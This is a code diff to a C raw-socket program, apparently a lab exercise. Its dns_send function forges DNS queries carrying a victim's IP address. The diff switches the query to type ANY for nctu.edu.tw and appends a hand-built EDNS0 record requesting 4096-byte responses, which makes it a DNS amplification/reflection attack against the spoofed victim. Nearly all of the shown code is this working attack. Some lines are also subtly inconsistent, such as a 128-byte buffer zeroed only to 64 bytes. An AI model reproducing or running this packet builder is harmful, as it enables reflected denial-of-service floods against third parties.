@@ -13,15 +13,10 @@
 #include <net/ethernet.h> //needless?
 #include <errno.h>
 
-//comment
+
 #define BUF_LEN 8192
 
-#define DESTMAC0 0x00
-#define DESTMAC1 0x50
-#define DESTMAC2 0x56
-#define DESTMAC3 0xf6
-#define DESTMAC4 0x96
-#define DESTMAC5 0xc1
+
 
 
 
@@ -115,7 +110,7 @@ int dns_send(int sock_raw, char *vic_ip, int udp_p, char *dns_ip){
     sin.sin_family = AF_INET;
     sin.sin_port = htons(udp_p);
     sin.sin_addr.s_addr = inet_addr(dns_ip);
-    unsigned char *sendbuff = (unsigned char*)malloc(64); // increase in case of more data
+    unsigned char *sendbuff = (unsigned char*)malloc(128); // increase in case of more data
     /* Construct Packet Buffer */
     memset(sendbuff,0,64); 
     int total_len = total_len = 0;
@@ -138,8 +133,8 @@ int dns_send(int sock_raw, char *vic_ip, int udp_p, char *dns_ip){
     total_len+= sizeof(struct udphdr);
     /* DNS header */
     struct dnshdr *dnsh = (struct dnshdr*)(sendbuff + total_len);
-
-    dnsh->id = (unsigned short) htons(516067);// 0516067 -> 0xDFE3
+    int id = 516067-((516067>>16)<<16);
+    dnsh->id = (unsigned short) htons(id);// 0516067 -> 0xDFE3
 
 	dnsh->qr = 0; //This is a query
 	dnsh->opcode = 0; //This is a standard query
@@ -148,25 +143,61 @@ int dns_send(int sock_raw, char *vic_ip, int udp_p, char *dns_ip){
 	dnsh->rd = 1; //Recursion Desired
 	dnsh->ra = 0; //Recursion not available! hey we dont have it (lol)
 	dnsh->z = 0;
-	dnsh->ad = 0;
+	dnsh->ad = 0;//unchanged
 	dnsh->cd = 0;
 	dnsh->rcode = 0;
 	dnsh->q_count = htons(1); //we have only 1 question
 	dnsh->ans_count = 0;
 	dnsh->auth_count = 0;
-	dnsh->add_count = 0;
+	dnsh->add_count = htons(1);
     total_len += sizeof(struct dnshdr);
     /* Construct Query */
     unsigned char *qname = (unsigned char *)(sendbuff + total_len);
     unsigned char dns_rcrd[32];
-	strcpy(dns_rcrd, "www.nctu.edu.tw");
+	strcpy(dns_rcrd, "nctu.edu.tw");
 	dns_format(qname , dns_rcrd);
 	total_len += strlen(qname)+1;//one empty byte
 	struct dnsquery *q;
 	q = (struct dnsquery *)(sendbuff + total_len);
-	q->q_type = htons(0x00ff);
+	q->q_type = htons(0x00FF);
 	q->q_class = htons(0x0001);
     total_len += sizeof(struct dnsquery);
+    /* Additional */
+    sendbuff[total_len++] = 0x00;
+    sendbuff[total_len++] = 0x00;
+    sendbuff[total_len++] = 0x29;
+    sendbuff[total_len++] = 0x10;
+    sendbuff[total_len++] = 0x00;
+    sendbuff[total_len++] = 0x00;
+    sendbuff[total_len++] = 0x00;
+    sendbuff[total_len++] = 0x00;
+    sendbuff[total_len++] = 0x00;
+    sendbuff[total_len++] = 0x00;
+    sendbuff[total_len++] = 0x0c;
+    sendbuff[total_len++] = 0x00;
+    sendbuff[total_len++] = 0x0a;
+    sendbuff[total_len++] = 0x00;
+    sendbuff[total_len++] = 0x08;
+    sendbuff[total_len++] = 0x3b;
+    sendbuff[total_len++] = 0xa4;
+    sendbuff[total_len++] = 0xad;
+    sendbuff[total_len++] = 0xa0;
+    sendbuff[total_len++] = 0x3c;
+    sendbuff[total_len++] = 0xf5;
+    sendbuff[total_len++] = 0x95;
+    sendbuff[total_len++] = 0x81;
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
     /* Filling the remaining fields of the IP and UDP headers */
     uh->len = htons((total_len - sizeof(struct iphdr)));
     iph->tot_len = htons(total_len); //UDP length field
